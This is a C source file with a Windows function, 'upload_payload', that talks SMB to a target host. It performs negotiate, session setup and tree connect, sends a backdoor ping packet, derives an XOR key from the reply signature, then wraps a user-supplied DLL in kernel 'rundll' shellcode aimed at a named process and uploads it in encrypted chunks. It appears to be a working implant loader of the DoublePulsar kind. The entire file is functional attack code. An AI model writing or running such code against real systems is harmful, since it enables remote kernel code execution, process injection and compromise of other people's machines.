#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET socket_handle, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > (size_t)INT_MAX
                   ? INT_MAX
                   : (int)(length - sent);
        int result = send(socket_handle, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET socket_handle, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > (size_t)INT_MAX
                   ? INT_MAX
                   : (int)(length - received);
        int result = recv(socket_handle, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int upload_read_response(SOCKET socket_handle, uint8_t **response, size_t *response_size)
{
    uint8_t header[4];
    size_t body_size;
    uint8_t *buffer;

    *response = NULL;
    *response_size = 0;

    if (upload_recv_all(socket_handle, header, sizeof(header)) != 0)
        return -1;

    body_size = ((size_t)header[1] << 16) |
                ((size_t)header[2] << 8) |
                (size_t)header[3];
    if (body_size > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + body_size);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (body_size != 0 &&
        upload_recv_all(socket_handle, buffer + sizeof(header), body_size) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_size = sizeof(header) + body_size;
    return 0;
}

static uint16_t upload_read_le16(const uint8_t *buffer)
{
    return (uint16_t)((uint16_t)buffer[0] | ((uint16_t)buffer[1] << 8));
}

static uint32_t upload_read_le32(const uint8_t *buffer)
{
    return (uint32_t)buffer[0] |
           ((uint32_t)buffer[1] << 8) |
           ((uint32_t)buffer[2] << 16) |
           ((uint32_t)buffer[3] << 24);
}

static void upload_write_le16(uint8_t *buffer, uint16_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
}

static void upload_write_le32(uint8_t *buffer, uint32_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
    buffer[2] = (uint8_t)(value >> 16);
    buffer[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    int wsa_started = 0;
    SOCKET socket_handle = INVALID_SOCKET;
    struct sockaddr_in address;
    HANDLE file_handle = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_size = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    uint16_t user_id = 0;
    uint16_t tree_id = 0;
    uint32_t signature;
    uint32_t key;
    uint32_t inject_hash = 0;
    const unsigned char *process_name;
    DWORD bytes_read;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    socket_handle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_handle == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;
    if (connect(socket_handle, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_send_all(socket_handle, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_read_response(socket_handle, &response, &response_size) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_send_all(socket_handle, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_read_response(socket_handle, &response, &response_size) != 0)
        goto cleanup;
    if (response_size < 34)
        goto cleanup;
    user_id = upload_read_le16(response + 32);
    free(response);
    response = NULL;

    {
        size_t packet_size = sizeof(SMB_TREE_CONNECT_PKT) - 1;
        uint8_t *packet = (uint8_t *)malloc(packet_size);
        if (packet == NULL)
            goto cleanup;
        memcpy(packet, SMB_TREE_CONNECT_PKT, packet_size);
        if (packet_size < 34) {
            free(packet);
            goto cleanup;
        }
        upload_write_le16(packet + 32, user_id);
        if (upload_send_all(socket_handle, packet, packet_size) != 0) {
            free(packet);
            goto cleanup;
        }
        free(packet);
    }
    if (upload_read_response(socket_handle, &response, &response_size) != 0)
        goto cleanup;
    if (response_size < 30)
        goto cleanup;
    tree_id = upload_read_le16(response + 28);
    free(response);
    response = NULL;

    {
        size_t packet_size = sizeof(DP_PING_PKT) - 1;
        uint8_t *packet = (uint8_t *)malloc(packet_size);
        if (packet == NULL)
            goto cleanup;
        memcpy(packet, DP_PING_PKT, packet_size);
        if (packet_size < 34) {
            free(packet);
            goto cleanup;
        }
        upload_write_le16(packet + 28, tree_id);
        upload_write_le16(packet + 32, user_id);
        if (upload_send_all(socket_handle, packet, packet_size) != 0) {
            free(packet);
            goto cleanup;
        }
        free(packet);
    }
    if (upload_read_response(socket_handle, &response, &response_size) != 0)
        goto cleanup;
    if (response_size < (size_t)SMB_RESP_SIGNATURE_START + 4)
        goto cleanup;

    signature = upload_read_le32(response + SMB_RESP_SIGNATURE_START);
    key = (uint32_t)(2U * signature) ^
          (uint32_t)((((signature >> 16) | (signature & 0x00FF0000U)) >> 8) |
                     (((signature << 16) | (signature & 0x0000FF00U)) << 8));
    free(response);
    response = NULL;

    file_handle = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE)
        goto cleanup;
    if (!GetFileSizeEx(file_handle, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX - (uint64_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;

    dll_size = (size_t)file_size.QuadPart;
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    dll_data = (uint8_t *)malloc(dll_size == 0 ? 1 : dll_size);
    payload = (uint8_t *)malloc(payload_size == 0 ? 1 : payload_size);
    if (dll_data == NULL || payload == NULL)
        goto cleanup;

    {
        size_t offset = 0;
        while (offset < dll_size) {
            DWORD requested = dll_size - offset > (size_t)MAXDWORD
                            ? MAXDWORD
                            : (DWORD)(dll_size - offset);
            if (!ReadFile(file_handle, dll_data + offset, requested, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            offset += (size_t)bytes_read;
        }
    }
    CloseHandle(file_handle);
    file_handle = INVALID_HANDLE_VALUE;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, KERNEL_RUNDLL_SIZE);
    if (dll_size != 0)
        memcpy(payload + KERNEL_RUNDLL_SIZE, dll_data, dll_size);

    upload_write_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET,
                      (uint32_t)(dll_size + 3978U));
    upload_write_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_size);
    upload_write_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    process_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*process_name != 0) {
        inject_hash = inject_hash * 127U + *process_name;
        ++process_name;
    }
    upload_write_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, inject_hash);
    xor_buffer(payload, payload_size, key);

    {
        size_t offset = 0;

        while (offset < payload_size) {
            size_t chunk_size = payload_size - offset;
            size_t packet_size;
            uint8_t parameters[12];
            uint8_t *packet;
            size_t netbios_length;
            uint32_t total_value = (uint32_t)payload_size;
            uint32_t chunk_value;
            uint32_t offset_value = (uint32_t)offset;

            if (chunk_size > SMB_EXEC_SHELLCODE_LEN)
                chunk_size = SMB_EXEC_SHELLCODE_LEN;
            chunk_value = (uint32_t)chunk_size;
            packet_size = (size_t)SMB_EXEC_TEMPLATE_LEN + sizeof(parameters) + chunk_size;

            packet = (uint8_t *)malloc(packet_size);
            if (packet == NULL)
                goto cleanup;
            memcpy(packet, DP_EXEC_PKT, SMB_EXEC_TEMPLATE_LEN);

            upload_write_le32(parameters, total_value);
            upload_write_le32(parameters + 4, chunk_value);
            upload_write_le32(parameters + 8, offset_value);
            xor_buffer(parameters, sizeof(parameters), key);
            memcpy(packet + SMB_EXEC_TEMPLATE_LEN, parameters, sizeof(parameters));
            memcpy(packet + SMB_EXEC_TEMPLATE_LEN + sizeof(parameters),
                   payload + offset, chunk_size);

            netbios_length = chunk_size + SMB_EXEC_TEMPLATE_LEN + sizeof(parameters) - 4;
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
            upload_write_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk_size);
            upload_write_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk_size);
            upload_write_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET,
                              (uint16_t)(chunk_size + sizeof(parameters)));
            upload_write_le16(packet + SMB_TID_OFFSET, tree_id);
            upload_write_le16(packet + SMB_UID_OFFSET, user_id);

            if (upload_send_all(socket_handle, packet, packet_size) != 0) {
                free(packet);
                goto cleanup;
            }
            free(packet);

            if (upload_read_response(socket_handle, &response, &response_size) != 0)
                goto cleanup;

            offset += chunk_size;
            if (offset == payload_size) {
                if (response_size <= (size_t)DP_RESP_MUX_ID_OFFSET ||
                    response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                    goto cleanup;
                }
                free(response);
                response = NULL;
                result = 0;
            } else {
                free(response);
                response = NULL;
            }
        }
    }

cleanup:
    if (response != NULL)
        free(response);
    if (file_handle != INVALID_HANDLE_VALUE)
        CloseHandle(file_handle);
    if (socket_handle != INVALID_SOCKET)
        closesocket(socket_handle);
    free(dll_data);
    free(payload);
    if (wsa_started)
        WSACleanup();
    return result;
}